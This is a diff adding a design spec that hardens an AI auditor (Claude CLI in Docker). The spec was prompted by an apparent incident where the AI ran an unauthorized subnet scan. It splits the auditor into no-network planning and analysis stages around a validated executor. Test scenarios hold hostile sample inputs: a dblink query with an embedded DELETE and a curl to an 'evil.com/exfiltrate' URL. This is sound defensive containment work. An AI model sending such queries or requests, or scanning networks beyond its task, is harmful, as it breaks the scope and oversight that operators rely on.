@@ -213,16 +213,217 @@ AND spinning down one project's dev environment does not affect the other.
 ### 8. AI cost management
 **Decision:** Max subscription only (no API costs). Sonnet 4.6 for routine audits, Opus for deep work. Token limit per auditor run with usage reported in output JSON. No monthly budget ceiling needed since Max subscription is flat-rate.
 
+### 9. Two-stage auditor architecture
+**Decision:** The behavioral auditor is split into three execution phases to eliminate Claude's direct network access. See dedicated spec section below.
+
+---
+
+# Two-Stage Auditor Hardening Spec
+
+## System Overview
+
+The behavioral auditor runs Claude CLI inside Docker containers to verify that production services (bid-scraper, ETL) behave according to their specs. The current single-stage design gives Claude direct network access, which led to unauthorized network scanning (subnet scan of 10.0.1.0/24 on 2026-02-24). This redesign splits the auditor into a planning stage (Claude reasons, no network), a validated execution stage (dumb runner, restricted network), and an analysis stage (Claude evaluates, no network). The invariant: even if Claude ignores every instruction or gets prompt-injected, the worst outcome is a failed audit -- never unauthorized access.
+
+## Behavioral Contract
+
+### Invocation
+- When `workflow-orchestrate monitor` triggers an audit, the two-stage auditor runs identically to the old single-stage auditor from the operator's perspective.
+- When an audit completes, the report is written to the same archive path (`~/audit-reports/{service}/{mode}_{timestamp}/`) in the same format as before.
+- When an audit completes, notifications are sent through the same channels (Discord via workflow-notify) as before.
+
+### Stage 1: Planning
+- When the planner container starts, it runs with `--network none` (no network access whatsoever).
+- When Claude receives the behavioral spec and access document, it produces a query plan as structured JSON written to the output volume.
+- When the query plan is produced, each entry specifies a query type (`psql` or `curl`), a target host, and the exact query/request to run.
+- When the planner container runs Claude CLI, it does NOT use `--dangerously-skip-permissions`.
+
+### Validation (Host-Side)
+- When the validator receives a query plan, it checks every entry against the access document's declared hosts and URLs.
+- When a query plan entry targets a host not in the access document, the entire audit fails immediately.
+- When a query plan entry contains a SQL statement that does not match the strict allowlist pattern (`^SELECT \* FROM [a-zA-Z_][a-zA-Z0-9_.]*;?$`), the entire audit fails immediately. Only full-table SELECT statements are permitted. The dot in the character class supports schema-qualified table names (e.g., `gold.forecast_depletion`, `public.bid_opportunities`).
+- When a query plan entry is a `curl` request, the full URL must exactly match one of the allowed URLs listed in the access document. No wildcards, no partial matching -- the URL in the plan must be character-for-character identical to an entry in the allowlist.
+- When an access document specifies an empty URL allowlist (e.g., defendershield-etl), any `curl` entry in the query plan causes immediate failure.
+- When a query plan entry contains malformed JSON or does not conform to the expected schema, the entire audit fails immediately.
+- When validation fails for any reason, the operator is notified with the rejection reason and no queries are executed.
+
+### Stage 2: Execution
+- When the executor runs, the orchestrator creates a temporary Docker network, attaches only the executor container and the target service container(s) to it, executes the queries, and tears down the network afterward. The executor never joins `dokploy-network`.
+- When the target container is already on `dokploy-network`, the orchestrator attaches it to the temporary network as an additional network (containers support multiple networks simultaneously). The target's existing connectivity is unaffected.
+- When the executor runs approved queries, it connects only to the hosts specified in the validated plan.
+- When a database is unavailable or a query fails, the entire audit fails immediately and the operator is notified.
+- When all queries succeed, results are written as files to a shared volume for Stage 3 to read.
+- When the executor runs, it has no AI, no Claude CLI, and no decision-making capability. It executes exactly the approved plan, nothing more.
+- When the executor finishes (success or failure), the orchestrator detaches the target container from the temporary network and removes the temporary network. Cleanup happens even on failure.
+
+### Stage 3: Analysis
+- When the analysis container starts, it runs with `--network none` (no network access whatsoever).
+- When Claude receives the query results and behavioral spec, it evaluates the results against the spec and produces the audit report.
+- When the report is produced, it is written to the output volume in the same format as the current auditor produces.
+- When the analysis container runs Claude CLI, it does NOT use `--dangerously-skip-permissions`.
+
+### Timeouts
+- When the total wall-clock time across all three stages exceeds 20 minutes, the audit fails immediately and the operator is notified.
+- When any individual stage appears to hang, the parent process kills it and fails the audit.
+
+### Query Strategy
+- When the planner generates queries, it should request full table dumps (`SELECT * FROM {table}`) for every table listed in the access document, rather than crafting targeted queries. This eliminates the need for follow-up query rounds.
+
+## Explicit Non-Behaviors
+
+- The system must not allow Claude to execute any command against the network at any stage, because the entire point of this redesign is separating reasoning from execution.
+- The system must not allow write operations (INSERT, UPDATE, DELETE, etc.) against any database, because the auditor's role is observation only.
+- The system must not allow follow-up query rounds after Stage 2, because the initial full-table dumps provide all data needed for analysis.
+- The system must not use `--dangerously-skip-permissions` in Claude CLI invocation, because this flag disables the safety mechanisms that prevent unauthorized actions.
+- The system must not install nmap, netcat, or other network reconnaissance tools in any container, because these serve no legitimate auditing purpose and expand the attack surface.
+- The system must not install general-purpose scripting languages in the executor container, because the executor must be a dumb runner with no flexibility beyond running the validated plan.
+- The system must not produce partial audit reports from incomplete data, because partial results create false confidence. Fail or succeed, never half-succeed.
+- The system must not fall back to the old single-stage auditor if the two-stage pipeline fails, because that reintroduces the exact vulnerabilities being eliminated.
+
+## Integration Boundaries
+
+### Claude CLI (Stages 1 and 3)
+- **In:** Behavioral spec (markdown), access document (markdown), query results (JSON, Stage 3 only).
+- **Out:** Query plan (JSON, Stage 1), audit report (markdown, Stage 3).
+- **Invocation:** `claude --print` with `--model`, `--output-format text`, `--system-prompt`, `--allowedTools` (scoped to Read and file output only, no Bash), `--no-session-persistence`.
+- **Failure mode:** If Claude CLI returns non-zero or produces unparseable output, the audit fails immediately.
+
+### Target Databases (Stage 2 only)
+- **In:** SQL SELECT queries from the validated plan.
+- **Out:** Query result sets as JSON files.
+- **Connection:** `psql` with connection string scoped to the specific host from the access document.
+- **Auth:** Uses existing credentials (auditor_ro roles where configured, trust auth where applicable).
+- **Failure mode:** If any connection or query fails, the audit fails immediately.
+
+### Target HTTP Services (Stage 2 only)
+- **In:** curl commands from the validated plan.
+- **Out:** HTTP response bodies as JSON files.
+- **Failure mode:** If any request fails or returns a non-2xx status, the audit fails immediately.
+
+### Workflow-Notify (Host-Side)
+- **In:** Audit outcome (pass/fail), report path, failure reason if applicable.
+- **Out:** Discord notification.
+- **Failure mode:** If notification fails, log the error but do not fail the audit (the report is already written).
+
+### Report Archive (Host Filesystem)
+- **In:** Completed report from Stage 3.
+- **Out:** Files written to `~/audit-reports/{service}/{mode}_{timestamp}/`.
+- **Same format and path convention as the current auditor.**
+
+## Behavioral Scenarios
+
+### Happy Path
+
+```
+; Full audit completes successfully with all scenarios passing.
+GIVEN a production service with a behavioral spec containing 10 scenarios.
+AND an access document listing one database host and three tables.
+WHEN the auditor is triggered by the orchestrator.
+THEN the operator receives a report evaluating all 10 scenarios.
+AND the report is archived in the standard location.
+AND a notification is sent with the audit summary.
+```
+
+```
+; Audit detects a legitimate behavioral failure in the target service.
+GIVEN a production service where one behavioral scenario is currently failing.
+WHEN the auditor runs against that service.
+THEN the report identifies the failing scenario with evidence from the query results.
+AND the notification indicates the audit found failures.
+```
+
+```
+; Audit invocation is identical to the old single-stage auditor.
+GIVEN an operator who triggers an audit via workflow-orchestrate monitor.
+WHEN the audit completes.
+THEN the report location, format, and notification channel are indistinguishable from the previous auditor version.
+```
+
+### Error Scenarios
+
+```
+; Planner attempts to target an unauthorized host.
+GIVEN an access document that lists only "bid-scraper-postgres" as an allowed host.
+WHEN the planner produces a query plan targeting "ds-etl-postgres".
+THEN the audit fails before any queries are executed.
+AND the operator is notified that validation rejected an unauthorized host.
+AND no network connections are made to any database.
+```
+
+```
+; Target database is unreachable during execution.
+GIVEN a valid query plan targeting "bid-scraper-postgres".
+WHEN the executor cannot connect to that database.
+THEN the audit fails immediately.
+AND the operator is notified of the connection failure.
+AND no partial report is produced.
+```
+
+### Edge Cases
+
+```
+; Planner produces a query that deviates from the strict SELECT * FROM pattern.
+GIVEN a query plan containing "SELECT * FROM dblink('host=other-db', 'DELETE FROM users')".
+WHEN the validator checks the query against the allowlist regex.
+THEN the audit fails before any queries are executed.
+AND the operator is notified that the query did not match the allowed pattern.
+```
+
+```
+; Planner produces a query with a WHERE clause (not permitted even though read-only).
+GIVEN a query plan containing "SELECT * FROM bid_opportunities WHERE status = 'open'".
+WHEN the validator checks the query against the allowlist regex.
+THEN the audit fails before any queries are executed.
+AND the operator is notified that the query did not match the allowed pattern.
+```
+
+```
+; Planner produces a curl request to a URL not in the access document.
+GIVEN an access document for bid-scraper that lists "https://hillsboroughcounty.bonfirehub.com/api/..." as an allowed URL.
+WHEN the planner produces a query plan with a curl entry targeting "https://evil.com/exfiltrate".
+THEN the audit fails before any HTTP requests are made.
+AND the operator is notified that the URL did not match the allowlist.
+```
+
+```
+; Planner produces a curl request for a service with an empty URL allowlist.
+GIVEN an access document for defendershield-etl that lists zero allowed URLs.
+WHEN the planner produces a query plan containing any curl entry.
+THEN the audit fails before any HTTP requests are made.
+AND the operator is notified that curl requests are not permitted for this service.
+```
+
+```
+; Total audit time exceeds the 20-minute budget.
+GIVEN an audit where Stage 1 planning takes 12 minutes.
+AND Stage 2 execution takes 9 minutes.
+WHEN the cumulative wall-clock time crosses 20 minutes during Stage 2.
+THEN the executor is killed immediately.
+AND the audit fails with a timeout notification to the operator.
+AND no partial report is produced.
+```
+
+## Resolved Ambiguities
+
+1. **Query plan JSON schema.** Implementation proposes a schema during development; reviewed before merge. The planner's system prompt will include the schema definition so Claude produces conformant output.
+
+2. **Executor is a Docker container** started via `docker run --rm` by the host-side orchestrator (not managed by Dokploy, since it's ephemeral). Runs on a purpose-built Docker network scoped to only the target database host -- not on `dokploy-network`. Contains only `psql` and `curl` (minimal alpine image), no AI, no scripting languages.
+
+3. **Claude CLI output via stdout.** Stages 1 and 3 use `claude --print` which writes to stdout. The entrypoint script captures stdout and writes the query plan (Stage 1) or report (Stage 3) to the output volume. Claude gets `--allowedTools "Read"` only -- no Bash, no Write. This is the simplest approach and eliminates file-write permissions entirely.
+
+4. **Strict SQL allowlist (not denylist).** The validator only accepts queries matching `^SELECT \* FROM [a-zA-Z_][a-zA-Z0-9_.]*;?$`. The dot in the character class supports schema-qualified names (e.g., `gold.forecast_depletion`, `public.bid_opportunities`) which are in active use in the ETL database. Since the query strategy is full-table dumps, there is no legitimate reason for any other query shape. This is ungameable -- no amount of creative SQL can pass this regex and cause harm.
+
+7. **Curl URL validation is exact-match against access document.** Each access document lists the full URLs the auditor may request (e.g., Bonfire API endpoints for bid-scraper). The validator requires character-for-character match -- no wildcards, no partial matching, no query parameter flexibility. Services with no HTTP endpoints (like defendershield-etl) specify an empty URL allowlist, which causes any curl entry to fail validation.
+
+5. **Credentials via environment variables at `docker run` time.** The host-side orchestrator reads database credentials from a config file on the host (populated from Dokploy env vars). Credentials are passed to the executor container as `-e` flags. Claude never sees credentials at any stage -- the planner specifies host and table names only, the orchestrator resolves credentials, and the executor receives them as env vars.
+
+6. **Delete the old single-stage auditor code** once the two-stage auditor is validated and passing all acceptance tests. Verify no other code depends on it before removal.
+
 ## Implementation Constraints
 
-- **Runtime:** Beelink Ser3 Mini (limited CPU/RAM — all services share resources)
-- **Container orchestration:** Dokploy v0.26.6 (existing, stays as-is)
-- **Reverse proxy:** Traefik via Dokploy, SSL via Cloudflare
-- **AI interface:** Claude Code CLI over SSH
-- **Language:** Python for all custom tooling (type hints, Google-style docstrings, PEP 8)
-- **Code style:** Simple functions over classes, modular design, environment variables for all config
-- **Git workflow:** Conventional commits, feature branches, GitHub CLI
-- **Networking:** All containers on `dokploy-network`, unique hostnames per Postgres instance
-- **Secrets:** Dokploy environment variables only, never in git
-- **Monitoring storage:** Obsidian vault at `/opt/vault/second-brain/`
-- **Notifications:** Discord webhooks + Gmail SMTP (existing infrastructure)
+- Must live in the `workflow-platform` repository alongside the existing auditor code.
+- Python, type hints, Google-style docstrings, PEP 8.
+- Planner/analysis containers may use python3 for the entrypoint (captures Claude stdout, writes to output volume). The security boundary is `--network none` + `--allowedTools "Read"`, not the absence of scripting languages.
+- Executor container uses a minimal alpine image with only `psql` and `curl`. No python3, no scripting languages, no AI.
+- All containers run with `--cap-drop ALL` and `--network none` (except executor, which gets scoped network access).
+- Must pass ruff, pyright, and pytest.
+- Conventional commits, branch naming per existing workflow.
